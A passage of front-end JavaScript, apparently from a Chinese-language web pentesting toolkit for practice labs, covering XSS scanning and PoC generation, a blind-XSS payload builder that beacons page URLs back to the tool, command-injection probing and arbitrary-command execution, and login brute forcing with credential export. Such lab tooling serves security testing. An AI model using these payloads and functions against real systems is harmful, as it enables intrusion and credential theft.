        <div class="chips">${form.names.map((name) => `<span class="chip">${esc(name)}</span>`).join('')}</div>
        <button class="btn btn-sm" data-form-index="${index}">应用此表单</button>
      </div>`).join('');
      $$('[data-form-index]', box).forEach((btn) => btn.addEventListener('click', () => {
        applyDetectedForm(forms[Number(btn.dataset.formIndex)]);
      }));
      toast(`识别到 ${forms.length} 个表单，可一键套用`, 'ok');
    } catch { /* handled */ }
  });

  /* ---------------- XSS ---------------- */
  const X = state.xss;

  function renderXssLevel(result) {
    const level = result.level || 'unknown';
    const badge = level.toUpperCase();
    const per = result.per_param || [];
    let desc = {
      low: '基础 script 标签原样反射，无需绕过。',
      medium: '部分标签被过滤，但事件处理器或大小写混淆仍可用。',
      high: '标签被强过滤或编码输出，需要结合变体尝试。',
      safe: '载荷未形成有效反射，可能被完全过滤或未进入页面。',
      unknown: '无法判定，请查看下方矩阵。',
    }[level] || '';
    if (per.length > 1) {
      desc = `共扫描 ${per.length} 个参数：` + per.map((item) => `${item.param}（${item.level.toUpperCase()}）`).join('、');
    }
    if (result.note) desc += ` ${result.note}`;
    $('#xssLevel').innerHTML = `<div class="level-badge ${level}">${badge}</div>
      <div><strong>${esc(result.level_text || '')}</strong><p>${esc(desc)}</p></div>`;
  }

  function renderXssTable(result) {
    const rows = result.results || [];
    if (!rows.length) { $('#xssTable').innerHTML = '<div class="empty">没有结果</div>'; return; }
    const multi = (result.params || []).length > 1;
    const body = rows.map((row, index) => {
      const [label, cls] = REFLECT_LABEL[row.reflection] || ['未知', 'chip'];
      const executable = row.reflection === 'raw' && ['html', 'attribute', 'tag', 'comment'].includes(row.context);
      const checked = executable ? 'checked' : '';
      return `<tr>
        <td><input type="checkbox" class="xss-pick" value="${esc(row.payload)}" ${checked} style="accent-color:#22e0ff"></td>
        <td class="num-cell">${index + 1}</td>
        ${multi ? `<td class="mono">${esc(row.param || '')}</td>` : ''}
        <td><span class="code-inline">${esc(row.payload)}</span></td>
        <td><span class="chip ${cls}">${label}</span></td>
        <td>${esc(row.context_text || '—')}</td>
        <td>${row.reflection === 'raw' ? '<span class="chip chip-bad">可能可执行</span>' : '<span class="chip">不可用</span>'}</td>
      </tr>`;
    }).join('');
    $('#xssTable').innerHTML = `<table><thead><tr><th style="width:28px"></th><th>#</th>${multi ? '<th>参数</th>' : ''}<th>载荷</th><th>反射</th><th>上下文</th><th>判定</th></tr></thead><tbody>${body}</tbody></table>`;
    $$('.xss-pick').forEach((input) => input.addEventListener('change', () => {
      if (input.checked) X.selected.add(input.value); else X.selected.delete(input.value);
    }));
  }

  $('#xssScan')?.addEventListener('click', async (event) => {
    if (state.xss.mode === 'stored') { await xssStoredScan(event.currentTarget); return; }
    const param = $('#xssParam').value.trim();
    if (!param) { toast('请填写参数名', 'warn'); return; }
    try {
      const task = await runTask('/api/xss/scan', { target: targetOf('xss'), param },
        { btn: event.currentTarget, label: '检测中' });
      X.result = task.result || {};
      X.selected = new Set((X.result.executable || []).map((row) => row.payload));
      renderXssLevel(X.result);
      renderXssTable(X.result);
      const count = (X.result.executable || []).length;
      toast(count ? `检测完成：${count} 个载荷可能可执行` : '检测完成：未形成可用反射', count ? 'ok' : 'warn');
    } catch { /* handled */ }
  });

  $('#xssVariants')?.addEventListener('click', async (event) => {
    const param = X.result?.poc_param || ($('#xssParam').value.split(',')[0] || '').trim();
    if (!param) { toast('请填写参数名', 'warn'); return; }
    const base = X.selected.values().next().value || '<script>alert(1)</script>';
    try {
      const task = await runTask('/api/xss/variants', { target: targetOf('xss'), param, payload: base },
        { btn: event.currentTarget, label: '生成中' });
      X.variant = task.result || {};
      const rows = (X.variant.variants || []).map((row) => {
        const [label, cls] = REFLECT_LABEL[row.reflection] || ['未知', 'chip'];
        return `<tr><td>${esc(row.name)}</td><td><span class="code-inline">${esc(row.payload)}</span></td>
          <td><span class="chip ${cls}">${label}</span></td><td>${esc(row.context_text || '—')}</td>
          <td class="hint">${esc(row.idea)}</td></tr>`;
      }).join('');
      $('#xssVariantsBox').innerHTML = `<div class="divider"></div>
        <div class="row between wrap"><strong style="font-size:12px">绕过变体验证</strong>
        <span class="chip chip-ok">${(X.variant.working || []).length} 可用</span></div>
        <div class="table-wrap"><table><thead><tr><th>变体</th><th>载荷</th><th>反射</th><th>上下文</th><th>思路</th></tr></thead><tbody>${rows}</tbody></table></div>`;
      toast(`${(X.variant.working || []).length} 个变体原样反射`, (X.variant.working || []).length ? 'ok' : 'warn');
    } catch { /* handled */ }
  });

  function renderDom(result) {
    const box = $('#xssDomBox');
    const findings = result.findings || [];
    const chips = [
      `<span class="chip ${findings.length ? 'chip-mag' : 'chip-ok'}">${findings.length} 处可疑</span>`,
      `<span class="chip">脚本 ${result.scripts_scanned || 0} 段</span>`,
      ...(result.sources || []).map((item) => `<span class="chip chip-cyan">${esc(item)}</span>`),
      ...(result.sinks || []).map((item) => `<span class="chip">${esc(item)}</span>`),
    ].join('');
    let table = '';
    if (findings.length) {
      table = `<div class="table-wrap"><table><thead><tr><th>Source</th><th>Sink</th><th>脚本</th><th>代码片段</th></tr></thead><tbody>${
        findings.map((item) => `<tr>
          <td><span class="chip chip-warn">${esc(item.source)}</span></td>
          <td><span class="chip chip-mag">${esc(item.sink)}</span></td>
          <td class="mono">${esc(item.script)}</td>
          <td><span class="code-inline">${esc(item.snippet)}</span></td>
        </tr>`).join('')}</tbody></table></div>`;
    } else {
      table = '<div class="empty sm">未发现明显的 source → sink 数据流。静态启发式结果仅供参考，DOM 型漏洞仍需结合交互手工验证。</div>';
    }
    box.innerHTML = `<div class="divider"></div>
      <div class="row between wrap"><strong style="font-size:12px">DOM 静态分析</strong>
      <span class="hint">启发式检测，不执行脚本</span></div>
      <div class="chips" style="margin-top:8px">${chips}</div>${table}`;
  }

  $('#xssDom')?.addEventListener('click', async (event) => {
    try {
      const task = await runTask('/api/xss/dom', { target: targetOf('xss') },
        { btn: event.currentTarget, label: '分析中' });
      const result = task.result || {};
      renderDom(result);
      toast(`DOM 分析完成：${(result.findings || []).length} 处可疑数据流`,
        (result.findings || []).length ? 'warn' : 'ok');
    } catch { /* handled */ }
  });

  function renderHeaders(result) {
    const box = $('#xssHeadersBox');
    const stateMap = { ok: ['chip-ok', 'OK'], warn: ['chip-warn', 'WARN'], bad: ['chip-bad', 'BAD'], info: ['chip', 'INFO'] };
    const rows = (result.checks || []).map((item) => {
      const [cls, label] = stateMap[item.state] || stateMap.info;
      return `<tr>
        <td>${esc(item.label)}</td>
        <td><span class="chip ${cls}">${label}</span></td>
        <td class="mono">${esc(String(item.value || '').slice(0, 180))}</td>
        <td class="hint">${esc(item.note)}</td>
      </tr>`;
    }).join('');
    box.innerHTML = `<div class="divider"></div>
      <div class="row between wrap"><strong style="font-size:12px">响应头 / CSP 审计</strong>
      <span class="chip ${result.grade === 'A' ? 'chip-ok' : result.grade === 'D' ? 'chip-bad' : 'chip-warn'}">${esc(result.grade)} · ${result.score}/100</span></div>
      <div class="table-wrap"><table><thead><tr><th>检查项</th><th>状态</th><th>值</th><th>说明</th></tr></thead><tbody>${rows}</tbody></table></div>`;
  }

  $('#xssHeaders')?.addEventListener('click', async (event) => {
    try {
      const task = await runTask('/api/xss/headers', { target: targetOf('xss') },
        { btn: event.currentTarget, label: '审计中' });
      const result = task.result || {};
      renderHeaders(result);
      toast(`防御评分 ${result.score}/100（${result.grade}）`, result.grade === 'A' ? 'ok' : 'warn');
    } catch { /* handled */ }
  });

  function renderDeep(result) {
    const box = $('#xssDeepBox');
    const rows = result.results || [];
    const body = rows.map((row) => {
      const [label, cls] = REFLECT_LABEL[row.reflection] || ['未知', 'chip'];
      const ok = row.reflection === 'raw' && ['html', 'attribute', 'tag', 'comment'].includes(row.context);
      return `<tr>
        <td><input type="checkbox" class="xss-deep-pick" value="${esc(row.payload)}" ${ok ? 'checked' : ''} style="accent-color:#ff2f87"></td>
        <td><span class="code-inline">${esc(row.payload)}</span></td>
        <td>${esc(row.tag)}</td>
        <td><span class="chip ${cls}">${label}</span></td>
        <td>${esc(row.context_text || '—')}</td>
        <td class="hint">${esc(row.note)}</td>
      </tr>`;
    }).join('');
    box.innerHTML = `<div class="divider"></div>
      <div class="row between wrap"><strong style="font-size:12px">深度向量库</strong>
      <span class="chip ${result.executable?.length ? 'chip-mag' : 'chip'}">可用 ${result.executable?.length || 0} / ${rows.length}</span></div>
      <p class="hint" style="margin:6px 0 0">覆盖 SVG / MathML / autofocus / srcdoc / 伪协议等解析器差异向量，勾选后可用于生成 POC。</p>
      <div class="table-wrap"><table><thead><tr><th style="width:28px"></th><th>载荷</th><th>类型</th><th>反射</th><th>上下文</th><th>说明</th></tr></thead><tbody>${body}</tbody></table></div>`;
  }

  $('#xssDeep')?.addEventListener('click', async (event) => {
    const param = X.result?.poc_param || ($('#xssParam').value.split(',')[0] || '').trim();
    if (!param) { toast('请先填写参数名', 'warn'); return; }
    try {
      const task = await runTask('/api/xss/deep', { target: targetOf('xss'), param },
        { btn: event.currentTarget, label: '深扫中' });
      const result = task.result || {};
      renderDeep(result);
      toast(`深度扫描完成：${(result.executable || []).length} 条可用`,
        (result.executable || []).length ? 'ok' : 'warn');
    } catch { /* handled */ }
  });

  function pocPayloads() {
    const picked = [
      ...$$('.xss-pick:checked'),
      ...$$('.xss-deep-pick:checked'),
    ].map((input) => input.value);
    if (picked.length) return picked;
    return (X.result?.executable || []).map((row) => row.payload);
  }

  $('#xssPoc')?.addEventListener('click', async (event) => {
    const param = X.result?.poc_param || ($('#xssParam').value.split(',')[0] || '').trim();
    const payloads = pocPayloads();
    if (!param) { toast('请填写参数名', 'warn'); return; }
    if (!payloads.length) { toast('没有可用的载荷，请先检测或勾选', 'warn'); return; }
    try {
      const task = await runTask('/api/xss/poc', { target: targetOf('xss'), param, payloads },
        { btn: event.currentTarget, label: '生成中' });
      X.poc = task.result || {};
      $('#xssPocActions').hidden = false;
      $('#xssDownloadStored').hidden = true;
      renderPoc();
      toast(`已生成 ${(X.poc.links || []).length} 条 POC 链路`, 'ok');
    } catch { /* handled */ }
  });

  function renderPoc() {
    if (!X.poc) return;
    const body = $('#xssPocBody');
    if (X.tab === 'links') {
      body.innerHTML = `<div class="link-list">${(X.poc.links || []).map((link, index) => `
        <div class="link-item"><div class="lbl">POC #${index + 1}</div>
        <code>${esc(link)}</code>
        <div style="margin-top:6px"><button class="cbtn copy-link" data-link="${esc(link)}">COPY</button></div></div>`).join('')}</div>`;
      $$('.copy-link').forEach((btn) => btn.addEventListener('click', async () => {
        try {
          await navigator.clipboard.writeText(btn.dataset.link);
          toast('已复制到剪贴板', 'ok');
        } catch { toast('复制失败，请手动选择', 'warn'); }
      }));
    } else if (X.tab === 'html') {
      body.innerHTML = `<pre>${esc(X.poc.html || '')}</pre>`;
    } else {
      body.innerHTML = `<pre>${esc(X.poc.markdown || '')}</pre>`;
    }
  }

  $$('#xssPocTabs .tab').forEach((tab) => tab.addEventListener('click', () => {
    $$('#xssPocTabs .tab').forEach((el) => el.classList.toggle('active', el === tab));
    X.tab = tab.dataset.tab;
    renderPoc();
  }));

  $('#xssOpenHtml')?.addEventListener('click', () => {
    if (!X.poc?.html) return;
    const blob = new Blob([X.poc.html], { type: 'text/html' });
    window.open(URL.createObjectURL(blob), '_blank');
  });
  $('#xssDownloadHtml')?.addEventListener('click', () => {
    if (X.poc?.html) download('xss-poc.html', X.poc.html, 'text/html');
  });
  $('#xssDownloadMd')?.addEventListener('click', () => {
    if (X.poc?.markdown) download('xss-poc.md', X.poc.markdown, 'text/markdown');
  });
  $('#xssSync')?.addEventListener('click', () => syncCookie('xss'));

  /* ---------------- blind XSS receiver ---------------- */
  function buildBlindPayload() {
    const token = ($('#blindToken').value.trim() || 'bx').replace(/[^\w-]/g, '');
    const type = $('#blindType').value;
    const beacon = `new Image().src='${location.origin}/api/xss/hit?t=${token}&u='+encodeURIComponent(location.href)`;
    if (type === 'img') return `<img src=x onerror="${beacon}">`;
    if (type === 'svg') return `<svg onload="${beacon}">`;
    return `<script>${beacon}</script>`;
  }

  function refreshBlindPayload() {
    $('#blindPayload').value = buildBlindPayload();
  }

  $('#blindToken')?.addEventListener('input', refreshBlindPayload);
  $('#blindType')?.addEventListener('change', refreshBlindPayload);
  $('#blindCopy')?.addEventListener('click', async () => {
    try {
      await navigator.clipboard.writeText($('#blindPayload').value);
      toast('盲打载荷已复制', 'ok');
    } catch {
      toast('复制失败，请手动选择', 'warn');
    }
  });

  async function loadHits() {
    try {
      const data = await api('/api/xss/hits');
      const items = data.items || [];
      const box = $('#blindHits');
      if (!items.length) {
        box.innerHTML = '<div class="empty">暂无命中</div>';
        return;
      }
      const rows = items.map((hit) => {
        const time = new Date(hit.time * 1000).toLocaleString('zh-CN', { hour12: false });
        return `<tr>
          <td class="num-cell">${time}</td>
          <td><span class="chip chip-cyan">${esc(hit.token)}</span></td>
          <td class="mono" title="${esc(hit.page)}">${esc(String(hit.page || '').slice(0, 80))}</td>
          <td class="hint" title="${esc(hit.ua)}">${esc(String(hit.ua || '').slice(0, 46))}</td>
          <td class="num-cell">${esc(hit.ip)}</td>
        </tr>`;
      }).join('');
      box.innerHTML = `<table><thead><tr><th>时间</th><th>Token</th><th>触发页面</th><th>UA</th><th>来源 IP</th></tr></thead><tbody>${rows}</tbody></table>`;
    } catch { /* silent */ }
  }

  $('#blindRefresh')?.addEventListener('click', () => { loadHits(); toast('已刷新命中', 'ok'); });
  $('#blindClear')?.addEventListener('click', async () => {
    if (!window.confirm('确定清空全部盲打命中记录？')) return;
    try {
      await api('/api/xss/hits', null, 'DELETE');
      loadHits();
      toast('命中记录已清空', 'ok');
    } catch (err) { toast(err.message, 'err'); }
  });

  /* ---------------- CMDI ---------------- */
  function renderCmdiFindings(result) {
    const box = $('#cmdiFindings');
    if (!result?.vulnerable) {
      box.innerHTML = '<div class="finding"><div class="finding-top"><span class="chip chip-warn">NOT FOUND</span><strong>未确认命令注入</strong></div><p class="hint">可尝试更换参数名，或检查靶场 exec 模块路径与 Cookie。</p></div>';
      return;
    }
    box.innerHTML = (result.findings || []).map((item, index) => `<div class="finding hot">
      <div class="finding-top"><span class="chip chip-mag">#${index + 1}</span><strong>参数 ${esc(item.param)}</strong>
      <span class="chip">${esc(item.name)}</span><span class="chip chip-cyan">${esc(item.os)}</span></div>
      <pre>${esc(item.template)}</pre>
      <div class="kv"><div><span class="k">whoami</span><span class="v">${esc(item.whoami || '未取到')}</span></div></div>
    </div>`).join('');
  }

  $('#cmdiProbe')?.addEventListener('click', async (event) => {
    const params = selectedParams('cmdi').length ? selectedParams('cmdi') : $('#cmdiParams').value.split(',');
    const clean = params.map((p) => p.trim()).filter(Boolean);
    if (!clean.length) { toast('请填写参数名', 'warn'); return; }
    try {
      const task = await runTask('/api/cmdi/probe', { target: targetOf('cmdi'), params: clean },
        { btn: event.currentTarget, label: '扫描中' });
      const result = task.result || {};
      renderCmdiFindings(result);
      state.cmdi.result = result;
      if (result.best) {
        state.cmdi.best = result.best;
        const select = $('#cmdiTemplate');
        if (!Array.from(select.options).some((opt) => opt.value === result.best.template)) {
          const option = document.createElement('option');
          option.value = result.best.template;
          option.textContent = `${result.best.name}（自动识别）`;
          select.appendChild(option);
        }
        select.value = result.best.template;
        $('#cmdiCommand').value = $('#cmdiCommand').value || 'whoami';
        toast(`已确认注入点：${result.best.param}（${result.best.name}）`, 'ok');
      } else {
        toast('未确认命令注入', 'warn');
      }
    } catch { /* handled */ }
  });

  $('#cmdiBlind')?.addEventListener('click', async (event) => {
    const param = state.cmdi.best?.param || ($('#cmdiParams').value.split(',')[0] || '').trim();
    if (!param) { toast('请先填写参数名', 'warn'); return; }
    try {
      const task = await runTask('/api/cmdi/blind', {
        target: targetOf('cmdi'), param,
        template: state.cmdi.best?.template || $('#cmdiTemplate').value,
      }, { btn: event.currentTarget, label: '探测中' });
      const result = task.result || {};
      if (result.vulnerable) {
        state.cmdi.best = {
          ...(state.cmdi.best || {}), param, template: result.template,
          name: result.name, os: result.os, whoami: '',
        };
        const select = $('#cmdiTemplate');
        if (!Array.from(select.options).some((opt) => opt.value === result.template)) {
          const option = document.createElement('option');
          option.value = result.template;
          option.textContent = `${result.name}（盲测）`;
          select.appendChild(option);
        }
        select.value = result.template;
        $('#cmdiFindings').innerHTML = `<div class="finding hot">
          <div class="finding-top"><span class="chip chip-mag">BLIND</span>
          <strong>参数 ${esc(result.param)}</strong><span class="chip chip-cyan">${esc(result.os)}</span></div>
          <pre>${esc(result.payload)}</pre>
          <div class="kv">
            <div><span class="k">基线耗时</span><span class="v">${result.baseline_ms} ms</span></div>
            <div><span class="k">注入耗时</span><span class="v">${result.payload_ms} ms</span></div>
            <div><span class="k">延迟信号</span><span class="v">${esc(result.name)}</span></div>
          </div></div>`;
        toast(`盲命令确认：${result.name}`, 'ok');
      } else {
        $('#cmdiFindings').innerHTML = `<div class="finding">
          <div class="finding-top"><span class="chip chip-warn">NO DELAY</span><strong>未确认盲命令注入</strong></div>
          <p class="hint">响应耗时没有明显增加，可能命令未执行、被缓存，或延迟阈值不够。</p></div>`;
        toast('未确认盲命令注入', 'warn');
      }
    } catch { /* handled */ }
  });

  $('#cmdiRun')?.addEventListener('click', async (event) => {
    const best = state.cmdi.best;
    const param = best?.param || ($('#cmdiParams').value.split(',')[0] || '').trim();
    const command = $('#cmdiCommand').value.trim();
    if (!param) { toast('请先完成注入点探测', 'warn'); return; }
    if (!command) { toast('请输入命令', 'warn'); return; }
    if ($('#cmdiAllowAll').checked && !state.cmdi.allowAll) {
      const ok = window.confirm('已解除只读白名单，将允许任意命令。请确认目标是隔离靶场，且不会影响真实系统。');
      if (!ok) return;
      state.cmdi.allowAll = true;
    }
    $('#cmdiOutput').textContent = '执行中…';
    try {
      const task = await runTask('/api/cmdi/execute', {
        target: targetOf('cmdi'), param, template: $('#cmdiTemplate').value,
        command, allow_all: $('#cmdiAllowAll').checked,
      }, { btn: event.currentTarget, label: '执行中' });
      const result = task.result || {};
      $('#cmdiOutput').innerHTML = `<span class="term-dim">[${esc(result.method || 'GET')}] $ ${esc(result.payload || '')}</span>\n${esc(result.output || '(无输出)')}`;
      state.cmdi.lastOutput = result.output || '';
      cmdHistory.unshift(command);
      if (cmdHistory.length > 30) cmdHistory.pop();
      histIndex = -1;
    } catch (err) {
      $('#cmdiOutput').innerHTML = `<span class="term-err">${esc(err.message)}</span>`;
    }
  });

  $('#cmdiAllowAll')?.addEventListener('change', (event) => {
    if (event.target.checked) {
      const ok = window.confirm('解除白名单后可以执行任意命令，仅限隔离靶场。继续？');
      if (!ok) { event.target.checked = false; return; }
      state.cmdi.allowAll = true;
      toast('已解除命令白名单', 'warn');
    } else {
      state.cmdi.allowAll = false;
    }
  });

  $$('.qcmd').forEach((btn) => btn.addEventListener('click', () => {
    $('#cmdiCommand').value = btn.textContent;
    $('#cmdiCommand').focus();
  }));
  $('#cmdiSync')?.addEventListener('click', () => syncCookie('cmdi'));

  const cmdHistory = [];
  let histIndex = -1;
  $('#cmdiCommand')?.addEventListener('keydown', (event) => {
    const input = event.currentTarget;
    if (event.key === 'Enter') {
      event.preventDefault();
      if (!$('#cmdiRun').disabled) $('#cmdiRun').click();
      return;
    }
    if (event.key === 'ArrowUp') {
      if (!cmdHistory.length) return;
      event.preventDefault();
      histIndex = Math.min(histIndex + 1, cmdHistory.length - 1);
      input.value = cmdHistory[histIndex];
    } else if (event.key === 'ArrowDown') {
      if (!cmdHistory.length) return;
      event.preventDefault();
      histIndex = Math.max(histIndex - 1, -1);
      input.value = histIndex === -1 ? '' : cmdHistory[histIndex];
    }
  });

  $('#cmdiCopy')?.addEventListener('click', async () => {
    const text = $('#cmdiOutput').innerText || '';
    if (!text.trim()) { toast('还没有输出', 'warn'); return; }
    try {
      await navigator.clipboard.writeText(text);
      toast('命令输出已复制', 'ok');
    } catch {
      toast('复制失败，请手动选择', 'warn');
    }
  });

  /* ---------------- BRUTE ---------------- */
  async function loadDefaults() {
    try {
      const data = await api('/api/defaults');
      if (!$('#bruteUsers').value.trim()) $('#bruteUsers').value = (data.users || []).join('\n');
      if (!$('#brutePasswords').value.trim()) $('#brutePasswords').value = (data.passwords || []).join('\n');
    } catch { /* ignore */ }
  }

  function splitList(text) {
    return String(text || '').split(/[\s,;]+/).map((s) => s.trim()).filter(Boolean);
  }

  function splitKeywords(text) {
    return String(text || '').split(/[\n,;]+/).map((s) => s.trim()).filter(Boolean);
  }

  async function bruteRun(event) {
    const users = splitList($('#bruteUsers').value);
    const passwords = splitList($('#brutePasswords').value);
    if (!users.length || !passwords.length) { toast('请填写用户名和密码字典', 'warn'); return; }
    const total = Math.min(users.length * passwords.length, parseInt($('#bruteMax').value, 10) || 500);
    state.brute.total = total;
    state.brute.target = $('#bruteUrl').value.trim();
    state.brute.found = [];
    $('#bruteBar').style.width = '0%';
    $('#bruteResult').innerHTML = '<div class="empty">爆破进行中，命中结果会实时写入…</div>';
    $('#bruteStop').disabled = false;
    $('#bruteExport').disabled = true;
    const btn = event.currentTarget;
    try {
      const task = await runTask('/api/brute/run', {
        target: targetOf('brute'),
        options: {
          usernames: $('#bruteUsers').value,
          passwords: $('#brutePasswords').value,
          user_field: $('#bruteUserField').value.trim() || 'username',
          pass_field: $('#brutePassField').value.trim() || 'password',
          submit_field: $('#bruteSubmitField').value.trim(),
          submit_value: 'Login',
          mode: $('#bruteMode').value,
          delay: parseFloat($('#bruteDelay').value) || 0.2,
          max_attempts: total,
          success_keywords: splitKeywords($('#bruteSuccess').value),
          failure_keywords: splitKeywords($('#bruteFailure').value),
          success_regex: $('#bruteRegex').value.trim(),
          auto_backoff: $('#bruteBackoff').checked,
        },
      }, {
        btn, label: '爆破中',
        onStart: (start) => { state.brute.taskId = start.task_id; },
        onTick: (t) => {
          $('#bruteBar').style.width = `${t.progress * 100}%`;
          $('#bruteProgress').textContent = `${Math.round(t.progress * total)} / ${total}`;
        },
      });
      const result = task.result || {};
      state.brute.found = result.found || [];
      renderBruteResult(result.found || []);
      $('#bruteExport').disabled = !state.brute.found.length;
      toast((result.found || []).length ? `命中 ${(result.found || []).length} 组凭证` : '本次未命中', (result.found || []).length ? 'ok' : 'warn');
    } catch {
      $('#bruteResult').innerHTML = '<div class="empty">执行失败，请查看控制台</div>';
    } finally {
      $('#bruteStop').disabled = true;
      $('#bruteBar').style.width = '0%';
    }
  }

  function renderBruteResult(found) {
    $('#bruteExport').disabled = !found.length;
    if (!found.length) {
      $('#bruteResult').innerHTML = '<div class="empty">未找到有效凭证</div>';
      return;
    }
    const rows = found.map((item, index) => `<tr>
      <td class="num-cell">${index + 1}</td>
      <td class="mono">${esc(item.username)}</td>
      <td class="mono" style="color:#3dff9e">${esc(item.password)}</td>
      <td class="num-cell">${item.status}</td>
      <td class="num-cell">${item.length}B</td>
    </tr>`).join('');
    $('#bruteResult').innerHTML = `<table><thead><tr><th>#</th><th>用户名</th><th>密码</th><th>状态</th><th>响应</th></tr></thead><tbody>${rows}</tbody></table>`;
  }

  $('#bruteRun')?.addEventListener('click', bruteRun);
  $('#bruteStop')?.addEventListener('click', async () => {
    if (!state.brute.taskId) return;
    try {
      await api(`/api/task/${state.brute.taskId}/stop`, {});
      toast('已发送中止指令', 'warn');
    } catch (err) { toast(err.message, 'err'); }
  });
  $('#bruteSync')?.addEventListener('click', () => syncCookie('brute'));

  function bindWordlistFile(inputId, textareaId) {
    $(inputId)?.addEventListener('change', (event) => {
      const file = event.target.files?.[0];
      if (!file) return;
      const reader = new FileReader();
      reader.onload = () => {
        const text = String(reader.result || '').replace(/\r/g, '').trim();
        if (!text) { toast('文件为空', 'warn'); return; }
        $(textareaId).value = text;
        toast(`已导入 ${file.name}（${text.split('\n').length} 行）`, 'ok');
        event.target.value = '';
      };
      reader.readAsText(file);
    });
  }

  bindWordlistFile('#bruteUsersFile', '#bruteUsers');
  bindWordlistFile('#brutePasswordsFile', '#brutePasswords');

  $('#bruteExport')?.addEventListener('click', () => {
    if (!state.brute.found.length) return;
    download('brute-credentials.csv',
      toCsv(['username', 'password', 'status', 'length'], state.brute.found),
      'text/csv;charset=utf-8');
  });

  /* ---------------- task center ---------------- */
  const TASK_STATUS = {
    running: ['chip-cyan', 'RUNNING'],
    done: ['chip-ok', 'DONE'],
    error: ['chip-bad', 'ERROR'],
    stopped: ['chip-warn', 'STOPPED'],
  };

  async function loadTasks() {
    try {
      const data = await api('/api/tasks');
      const items = data.items || [];
      $('#taskCount').textContent = `${items.length} 个任务`;
      const box = $('#taskTable');
      if (!items.length) {
        box.innerHTML = '<div class="empty">暂无任务</div>';
        return;
      }
      const rows = items.map((task) => {
        const [cls, label] = TASK_STATUS[task.status] || ['chip', task.status];
        const time = new Date(task.started * 1000).toLocaleTimeString('zh-CN', { hour12: false });
        const seconds = Math.max(0, Math.round((task.ended || (Date.now() / 1000)) - task.started));
        const pct = Math.round((task.progress || 0) * 100);
        return `<tr>
          <td><span class="chip ${cls}">${label}</span></td>
          <td>${esc(task.kind.toUpperCase())}</td>
          <td class="mono">${esc(task.title)}</td>
          <td style="min-width:120px"><div class="mini-progress"><i style="width:${pct}%"></i></div><span class="hint">${pct}%</span></td>
          <td class="num-cell">${time}</td>
          <td class="num-cell">${seconds}s</td>
          <td><div class="row gap">
            ${task.status === 'running' ? `<button class="cbtn task-stop" data-id="${task.id}">STOP</button>` : ''}
            <button class="cbtn task-logs" data-id="${task.id}">LOGS</button>
          </div></td>
        </tr>`;
      }).join('');
      box.innerHTML = `<table><thead><tr><th>状态</th><th>模块</th><th>任务</th><th>进度</th><th>开始</th><th>耗时</th><th>操作</th></tr></thead><tbody>${rows}</tbody></table>`;
      $$('.task-stop').forEach((btn) => btn.addEventListener('click', async () => {
        try {
          await api(`/api/task/${btn.dataset.id}/stop`, {});
          toast('已发送中止指令', 'warn');
          loadTasks();
        } catch (err) { toast(err.message, 'err'); }
      }));
      $$('.task-logs').forEach((btn) => btn.addEventListener('click', () => showTaskLogs(btn.dataset.id)));
    } catch (err) {
      $('#taskTable').innerHTML = `<div class="empty">${esc(err.message)}</div>`;
    }
  }

  async function showTaskLogs(taskId) {
    try {
      const task = await api(`/api/task/${taskId}`, null, 'GET');
      logConsole('sys', `—— 任务日志：${task.title}（${task.log_total} 行）——`);
      (task.logs || []).forEach((item) => logConsole(item.level, item.msg));
      toast('日志已输出到底部控制台', 'ok');
    } catch (err) {
      toast(err.message, 'err');
    }
  }

  $('#taskRefresh')?.addEventListener('click', loadTasks);

  /* ---------------- HISTORY ---------------- */
  async function loadHistory() {
    try {
      const data = await api('/api/history');
      state.history = data.items || [];
      $('#historyCount').textContent = `${state.history.length} 条`;
      const box = $('#historyTable');
      if (!state.history.length) {
        box.innerHTML = '<div class="empty">暂无记录，完成一次探测后会自动归档</div>';
        return;
      }
      const rows = state.history.map((item) => {
        const time = new Date(item.started * 1000).toLocaleString('zh-CN', { hour12: false });
        const sev = SEV_LABEL[item.severity] || item.severity;
        const cls = item.severity === 'critical' || item.severity === 'high' ? 'chip-mag' : 'chip';
        return `<tr class="clickable" data-id="${esc(item.id)}">
          <td class="num-cell">${time}</td>
          <td>${esc(item.kind.toUpperCase())}</td>
          <td class="mono" title="${esc(item.target)}">${esc(String(item.target || '').slice(0, 46))}</td>
          <td>${esc(item.summary)}</td>
          <td><span class="chip ${cls}">${esc(sev)}</span></td>
          <td class="num-cell">${item.duration}s</td>
        </tr>`;
      }).join('');
      box.innerHTML = `<table><thead><tr><th>时间</th><th>模块</th><th>目标</th><th>结论</th><th>等级</th><th>耗时</th></tr></thead><tbody>${rows}</tbody></table>`;
      $$('tr.clickable', box).forEach((row) => row.addEventListener('click', () => openDetail(row.dataset.id)));
    } catch (err) {
      $('#historyTable').innerHTML = `<div class="empty">${esc(err.message)}</div>`;
    }
  }

  $('#historyRefresh')?.addEventListener('click', loadHistory);

  let detailRecord = null;

  async function openDetail(recordId) {
    try {
      const record = await api(`/api/history/${recordId}`, null, 'GET');
      detailRecord = record;
      $('#detailTitle').textContent = record.title || '任务详情';
      const time = new Date(record.started * 1000).toLocaleString('zh-CN', { hour12: false });
      const sev = SEV_LABEL[record.severity] || record.severity;
      $('#detailMeta').innerHTML = [
        `<span class="chip chip-cyan">${esc(record.kind.toUpperCase())}</span>`,
        `<span class="chip">${esc(time)}</span>`,
        `<span class="chip">${record.duration}s</span>`,
        `<span class="chip">${esc(sev)}</span>`,
        `<span class="chip">${esc(record.status)}</span>`,
      ].join('');
      $('#detailBody').textContent = JSON.stringify(record.detail ?? record, null, 2);
      $('#detailModal').hidden = false;
    } catch (err) {
      toast(err.message, 'err');
    }
  }

  $('#closeDetail')?.addEventListener('click', () => { $('#detailModal').hidden = true; });
  $('#detailModal')?.addEventListener('click', (event) => {
    if (event.target.id === 'detailModal') $('#detailModal').hidden = true;
  });
  $('#detailDownload')?.addEventListener('click', () => {
    if (!detailRecord) return;
    download(`task-${detailRecord.id}.json`, JSON.stringify(detailRecord, null, 2), 'application/json');
  });
  $('#historyExport')?.addEventListener('click', () => { window.location.href = '/api/history/markdown'; });
  $('#historyReport')?.addEventListener('click', () => {
    if (!S.history.length) { toast('还没有任务记录', 'warn'); return; }
    window.location.href = '/api/history/html';
    toast('总报告已生成，浏览器开始下载', 'ok');
  });
  $('#historyClear')?.addEventListener('click', async () => {
    if (!window.confirm('确定清空全部任务记录？该操作不可恢复。')) return;
    try {
      await api('/api/history', null, 'DELETE');
      toast('记录已清空', 'ok');
      loadHistory();
      loadDashboard();
    } catch (err) { toast(err.message, 'err'); }
  });

  /* ---------------- 一键全流程 ---------------- */
  const FULL_STATE = { ok: ['有发现', 'chip-bad'], warn: ['未发现', 'chip-ok'], fail: ['失败', 'chip-warn'], skip: ['跳过', 'chip'] };

